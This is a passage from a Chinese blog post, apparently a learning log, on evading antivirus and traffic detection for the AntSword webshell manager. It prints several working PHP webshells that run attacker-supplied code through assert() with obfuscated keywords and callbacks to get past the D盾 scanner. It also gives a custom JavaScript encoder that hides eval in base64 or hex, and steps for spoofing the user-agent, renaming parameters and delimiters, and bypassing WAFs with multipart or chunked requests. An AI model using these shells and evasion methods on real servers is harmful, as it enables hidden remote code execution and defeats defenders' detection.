<p>我们在看下BaseInfo()函数具体执行的操作，这里的代码和我们使用其他模式发送的数据是一样的，就是获取服务端的基本信息进行输出，</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132906141.png" alt="image-20200727132906141"></p>
<p>custom模式我们大概了解了，再看下一个shell。</p>
<h4 id="php-eval-rsa-script"><a href="#php-eval-rsa-script" class="headerlink" title="php_eval_rsa_script"></a>php_eval_rsa_script</h4><p>使用这个shell的条件是需要开启openssl的，而且我测试php5.4.45没成功，在php5.3.29下是可以的。</p>
<p>在phpinfo中查看是否开启了openssl</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727143928992.png" alt="image-20200727143928992"></p>
<p>开启了openssl后，我们找到蚁剑的编码管理功能，有个rsa配置的功能。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144031550.png" alt="image-20200727144031550"></p>
<p>打开后内容如下，主要分为三个部分，RSA的公钥，私钥和php代码。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144108286.png" alt="image-20200727144108286"></p>
<p>我们将生成的php代码传到服务端，因为这里获取数据是通过公钥解密的，所以我们需要使用私钥对我们传递的数据进行加密，因此需要创建一个编码器。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144333763.png" alt="image-20200727144333763"></p>
<p>创建好编码器后，我们在连接的时候选择我们创建的rsa编码器即可</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144450235.png" alt="image-20200727144450235"></p>
<p>使用rsa加密后数据包的内容如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144526707.png" alt="image-20200727144526707"></p>
<h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h3><p>首先，抛开custom类型的shell，我们发现其他的shell本质上都是构造了一个命令执行的点，所以我们只要构建一个命令执行的点就可以了。</p>
<p>我这里以D盾来测试shell的静态免杀，我将蚁剑自带的assert那个马扔上去d盾会爆已知后门，然后我尝试将里面的关键字进行更改，已经无法造成一个命令执行的功能了，D盾还是会爆已知后门，也就是说D盾这里检测应该是进行了某些关键字的匹配的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150401374.png" alt="image-20200727150401374"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150414729.png" alt="image-20200727150414729"></p>
<p>我将第二行的内容删掉，D盾还是会爆二级，也就是说如果我们想要静态免杀完全过D盾，不能直接使用变量名做函数名这种方式。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150635040.png" alt="image-20200727150635040"></p>
<p>而且这里和是否接收参数也无关，都会爆的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150819212.png" alt="image-20200727150819212"></p>
<p>我发现D盾在这里进行拦截时是会去匹配括号是否闭合的，那我们就可以测试，当我假如复杂的括号时，能否绕过这个规则。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727155255367.png" alt="image-20200727155255367"></p>
<p>这样虽然可以达到绕过的目的，但是也不符合php的语法。所以我想将括号里的内容注释掉，不过加了注释后又会被拦截。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727162618952.png" alt="image-20200727162618952"></p>
<p>我尝试在这些括号的两边加上单双引号，也是无法绕过的，我看网上之前有人加了反引号进行绕过，可能是版本更新了吧，我通过那种方式无法绕过，好吧，我承认这个点我绕不过去了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果没有思路了，那就是自己的知识受限了，因此我去看了看其他人的文章</span><br></pre></td></tr></table></figure>

<p>有篇文章也是用了变量函数，但是并没有被拦截。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727170037503.png" alt="image-20200727170037503"></p>
<p>所以D盾的拦截可变变量的规则是在$xx()在行首的时候，然后我试了试使用上面那种方式的shell，这个仍然还可以免杀。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727171248076.png" alt="image-20200727171248076"></p>
<p>但是能不能免杀并不是我们的重点，因为是学习嘛，所以得知道为什么他就能免杀了。一方面是上面我分析的绕过了变量函数的检测，我再测试了下，当我们不使用可变变量的形式而是直接assert调用的话是会被拦的。所以就使用了两个技术</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.变量函数的检测绕过</span><br><span class="line">2.通过变量函数来将函数关键字和函数调用部分分开了，破坏了类似于assert()这样的拦截规则。</span><br></pre></td></tr></table></figure>

<p>这个是最主要的绕过的点，如果被其他的杀软拦截了，我们还可以进行各种变形。</p>
<p><strong>方法一：关键字拆分</strong></p>
<p>关于assert这个关键字的各种变形</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;&#39;a&#39;.&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;   &#x2F;&#x2F;拼接</span><br><span class="line">$a &#x3D; substr(&#39;1a&#39;,1).substr(&#39;1as&#39;,2).&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;; &#x2F;&#x2F;拼接+截取</span><br><span class="line">$a &#x3D; strtr(&#39;azxcvt&#39;,&#39;zxcv&#39;,&#39;sser&#39;);&#x2F;&#x2F;截取替换</span><br><span class="line">$a &#x3D; substr_replace(&quot;asxxx&quot;,&quot;sert&quot;,2); &#x2F;&#x2F;替换</span><br><span class="line">$a&#x3D;chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);</span><br></pre></td></tr></table></figure>

<p><strong>方法二：改变调用函数</strong></p>
<p>上面的shell我们是调用assert达到代码执行的目的，那么有没有那个函数可以替换assert这个函数呢。本来以为会有很多函数，查了下发现没有那种可以直接调用的，不过可以通过一些回调函数来解决。我以call_user_func为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;call_user_func&quot;;</span><br><span class="line">$c&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c,$_POST[&#39;ant&#39;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当然也可以拿其他函数进行变形绕过，这里只是给一个思路。</p>
<p><strong>方法三：改变array+var_dump</strong></p>
<p>通过前面的绕过，我们知道这种绕过Dd盾方法的核心在于可变函数的调用方式没有被检测出来，也就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(&#39;&#39;&#x3D;&gt;$a($c,$_POST[&#39;ant&#39;]));</span><br></pre></td></tr></table></figure>

<p>那么我们在这部分要绕过的点就是有没有哪些调用方式可以放在可变函数的前面，我尝试写个自定义函数来进行绕过，但是使用这种方法不能绕过。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727214520026.png" alt="image-20200727214520026"></p>
<p>之前我们调用的是var_dump,也可以调用其他方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;]));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>还可以这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;&quot;assert&quot;;</span><br><span class="line">	$arr &#x3D; new ArrayObject(array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;])));</span><br><span class="line">	$arr-&gt;uksort();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>好了，关于静态免杀先学到这，其他的方式当然还有很多，我只是挑了一个点而已。</p>
<h3 id="动态免杀"><a href="#动态免杀" class="headerlink" title="动态免杀"></a>动态免杀</h3><p>上面的操作只是帮我们过了一个shell查杀工具的静态查杀，但是有时候会有这样的情况，就是shell传上去好好的，也没杀，只要一连接就被干掉了，这是为什么呢？这个就涉及到流量方面的免杀了。</p>
<h4 id="特征去除"><a href="#特征去除" class="headerlink" title="特征去除"></a>特征去除</h4><p>关于蚁剑这款工具，功能很强大，用起来也挺舒服，但是他出名啊，出名的话就会被很多厂商拿去分析，所以我们在使用蚁剑的时候需要去除我们使用蚁剑和服务端进行交互的流量特征，那么都有什么特征呢？</p>
<h5 id="特征一：user-agent"><a href="#特征一：user-agent" class="headerlink" title="特征一：user-agent"></a>特征一：user-agent</h5><p>​    这个特征是一个非常明显的特征，就和sqlmap的user-agent一样，都是和工具相关的，我们看下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090059610.png" alt="image-20200728090059610"></p>
<p>这个特征非常明显吧，所以我们使用蚁剑这个特征是一定要改的，我们找到/modules/request.js文件，有个USER_AGENT</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090412292.png" alt="image-20200728090412292"></p>
<p>我们将它改成百度的爬虫</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (compatible; Baiduspider-render&#x2F;2.0;+http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)</span><br></pre></td></tr></table></figure>

<p>网上还有人说，需要更改/modules/update.js的请求头，但我看了下这个功能是和github进行交互的，不是和目标交互的流量，所以我认为可以不改吧。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090753980.png" alt="image-20200728090753980"></p>
<p>然后重启蚁剑，USER-AGENT内容就已经成功被修改了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091048839.png" alt="image-20200728091048839"></p>
<h5 id="特征二：变量规则"><a href="#特征二：变量规则" class="headerlink" title="特征二：变量规则"></a>特征二：变量规则</h5><p>首先来看下蚁剑的一个数据包，注意看下我圈出来的部分，这里面字符的长度是固定的，在变量那部分，长度是固定的14位，返回包部分前面是9位，后面是7位。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091745973.png" alt="image-20200728091745973"></p>
<p>我们新建一个编码器对发送的数据进行处理，编码器里面有个默认的实例，是base64的编码器，就是我们上面图中发送数据使用的编码器，我们学习下是怎么处理的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728092809554.png" alt="image-20200728092809554"></p>
<p>作者也非常贴心的把注释写的非常清楚，首先是生成一个14位长度的随机值当作参数名，然后把我们需要传递的内容base64编码进行赋值，然后在pwd中传入代码执行的代码。</p>
<p>首先看下变量长度的问题如何解决，可以通过随机生成一个长度字段，再去根据长度去随机生成相应的内容，这样就可以确保每次发起请求的参数长度是变化的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let num &#x3D;  Math.floor(Math.random()*15);</span><br><span class="line">let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(num)&#125;&#96;;</span><br></pre></td></tr></table></figure>

<p>这样我们发送的参数名的长度就是变化的了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728102211355.png" alt="image-20200728102211355"></p>
<p>但是我们仍然有一个核心的问题没有解决，就是在我们发送的流量里面会有eval，这个如何解决呢？</p>
<h5 id="特征三：eval特征处理"><a href="#特征三：eval特征处理" class="headerlink" title="特征三：eval特征处理"></a>特征三：eval特征处理</h5><p>我参考了蚁剑作者关于这部分处理的文章，他是将eval这部分进行了编码，如果直接对eval进行编码，那在服务端是无法识别这个流量的，因此服务端也需要对这个数据进行base64解码，使用这种方法需要稍微改变一下服务端的代码。</p>
<p>首先修改一下编码器的代码，将eval部分的代码base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[pwd] &#x3D; Buffer.from(&#96;eval(base64_decode($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;base64&#39;);</span><br></pre></td></tr></table></figure>

<p>然后在修改下我们的shell，让其在接收参数的时候进行base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;base64_decode($_POST[&#39;ant&#39;]);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后再抓包看下流量，已经没有eval的特征了</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728104852973.png" alt="image-20200728104852973"></p>
<p>其实同理，我们既然可以base64,为什么不能hex呢？</p>
<p>这个我就不讲了，如果理解了base64，那么这个也非常容易</p>
<p><strong>编码器</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;07&#x2F;28 10:16:51</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let num &#x3D;  Math.floor(Math.random()*15);</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(num)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  data[pwd] &#x3D; Buffer.from(&#96;eval(Hex2String($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>shell</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function Hex2String($hex)&#123;</span><br><span class="line">    $string&#x3D;&#39;&#39;;</span><br><span class="line">    for ($i&#x3D;0; $i &lt; strlen($hex)-1; $i+&#x3D;2)&#123;</span><br><span class="line">        $string .&#x3D; chr(hexdec($hex[$i].$hex[$i+1]));</span><br><span class="line">    &#125;</span><br><span class="line">    echo $string;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;Hex2String($_POST[&#39;ant&#39;]);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后效果如下;</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728105845603.png" alt="image-20200728105845603"></p>
<p>这种简单的编解码处理可能防护设备也会自己解码，我们可以使用各种加密，或者自己写一个简单的算法对数据进行处理，甚至使用多种编解码+加密方式混合处理。</p>
<h5 id="特征四：返回包格式"><a href="#特征四：返回包格式" class="headerlink" title="特征四：返回包格式"></a>特征四：返回包格式</h5><p>我这里查看了下蚁剑处理返回包的模板，发现其实蚁剑对返回包的分隔符的长度是随机生成的，代码在source/core/php/index.js中</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728111846522.png" alt="image-20200728111846522"></p>
<p>所以在返回包处理这部分，我们更应该关注的不是返回包格式的问题，而是返回的明文内容的问题，这些特征都是特别明显的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112128155.png" alt="image-20200728112128155"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112144427.png" alt="image-20200728112144427"></p>
<p>这里蚁剑本身就提供了一些解码器使用，比如base64解码，只要我们在使用的时候选择解码器就行了，不用我们在shell里面添加解码功能。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134220904.png" alt="image-20200728134220904"></p>
<p>使用效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134243030.png" alt="image-20200728134243030"></p>
<p>我们再看下我们发送的数据是怎么样的，如下图所示，就是我们发送的数据包中让其在输出的时候做了一个base64的编码</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134401588.png" alt="image-20200728134401588"></p>
<p>同理，蚁剑还提供了rot13的解码器，使用效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134524436.png" alt="image-20200728134524436"></p>
<h5 id="特征五：custom-shell的特性"><a href="#特征五：custom-shell的特性" class="headerlink" title="特征五：custom shell的特性"></a>特征五：custom shell的特性</h5><p>首先我们使用一个custom模式的shell，然后抓包看下返回包,有没有看到一个非常明显的特征。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728152948041.png" alt="image-20200728152948041"></p>
<p>对的，如你所见，这个特征就是-&gt;|和|&lt;-，正常的数据包中基本不会出现这个，因此这个也会被当作是蚁剑的特征。因为这边我们只传入了一个A，因此返回的处理逻辑肯定是写在custom的shell里的，我在shell中找到了对应的代码，但是直接删除后发现蚁剑不能正常工作了，也就是如果要删除这个东西会影响蚁剑对返回包的解析，因此可能需要修改蚁剑处理custom模式返回包部分的代码。在蚁剑的source/core/custom/index.js中，我找到了对应的代码位置。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728153806619.png" alt="image-20200728153806619"></p>
<p>所以我们只要对这部分进行修改就可以了，我们要确保这个符号不会在返回包的内容中出现，我这里随便取了个@#来作为分割符。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154120506.png" alt="image-20200728154120506"></p>
<p>同样，我们要在蚁剑的custom shell中进行相应的修改。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154150241.png" alt="image-20200728154150241"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154202049.png" alt="image-20200728154202049"></p>
<p>然后就可以正常的使用了</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154219306.png" alt="image-20200728154219306"></p>
<p>关于custom模式，还有第二个特性，就是关于传入的参数的参数名，z0,z1,z2等等，这个也算一个特征把，所以我们也需要把它处理一下，这个同样需要在shell和蚁剑同时处理，我在php的custom shell中找到了如下代码</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160653504.png" alt="image-20200728160653504"></p>
<p>所以我们需要把这几个参数改成比较正常的参数名。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162411446.png" alt="image-20200728162411446"></p>
<p>然后需要在蚁剑中找到这部分代码进行处理，这个处理就比较麻烦些，因为在好几个文件中都出现了。然后我分别在如下的几个文件中做了处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source\core\custom\template\database\default.js</span><br><span class="line">source\core\custom\template\command.js</span><br><span class="line">source\core\custom\template\filemanager.js</span><br></pre></td></tr></table></figure>

<p>处理后效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162553173.png" alt="image-20200728162553173"></p>
<h4 id="流量免杀"><a href="#流量免杀" class="headerlink" title="流量免杀"></a>流量免杀</h4><p>最后我们来学学流量混淆这部分，其实这里一方面是运用各种加密解密来对流量进行混淆，另一方面就是使用一些蚁剑本身提供的特性来进行混淆。</p>
<h5 id="方法一：更改post的格式为Multipart"><a href="#方法一：更改post的格式为Multipart" class="headerlink" title="方法一：更改post的格式为Multipart"></a>方法一：更改post的格式为Multipart</h5><p>我们如果之前简单了解过一些绕WAF的技巧，我们就知道有些WAF针对于不同的请求类型的拦截规则是不一样的，大多数的WAF会对GET类型的请求拦截非常严格，但是对于POST会弱一些，有时候假如我们改变了请求体的方式为Multipart，有些WAF甚至只会检测文件上传漏洞，所以呢，可以通过这个特性来进行简单的绕过。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155455601.png" alt="image-20200728155455601"></p>
<p>设置后的效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155629444.png" alt="image-20200728155629444"></p>
<h5 id="方法二：分块传输"><a href="#方法二：分块传输" class="headerlink" title="方法二：分块传输"></a>方法二：分块传输</h5><p>之前别人公开了分块传输绕WAF的方法后，后来做项目中遇到不少WAF都可以直接通过分块传输绕过。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155810488.png" alt="image-20200728155810488"></p>
<p>这里我设置好并刷新了下缓存，然后在burp上查看发包的这个过程，比较奇怪的是并没有发现分块传输的迹象。</p>
